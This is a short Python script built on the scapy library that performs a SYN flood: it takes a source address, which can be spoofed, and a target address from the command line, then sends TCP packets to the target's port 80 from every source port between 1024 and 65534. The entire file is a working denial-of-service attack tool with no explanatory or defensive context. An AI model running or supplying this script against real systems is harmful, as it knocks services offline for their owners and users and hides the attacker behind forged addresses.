from scapy.all import *
import sys

def syncflood(src,dest,port):

	for sport in range(1024,65535):
		IPLayer = IP (src=src, dst=dest)
		TCPLayer = TCP (sport = sport, dport = port)
		pkt = IPLayer / TCPLayer
		send (pkt)


syncflood(sys.argv[1],sys.argv[2],80)
		
